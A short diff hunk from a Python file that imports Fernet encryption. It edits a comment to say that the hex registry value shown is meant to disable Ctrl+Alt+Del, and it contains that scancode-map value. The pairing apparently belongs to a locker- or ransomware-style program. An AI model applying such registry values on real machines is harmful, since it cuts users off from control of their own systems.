@@ -9,7 +9,7 @@ import sys
 from cryptography.fernet import Fernet
 import struct
 
-# Registry entry (in hexadecimal format)
+# Registry entry (in hexadecimal format for disable ctrl+alt+del)
 registry_input = "00,00,00,00,00,00,00,00,03,00,00,00,4d,e0,1d,e0,4b,e0,1d,00,00,00,00,00"
 
 # Convert the input to a list of hexadecimal values
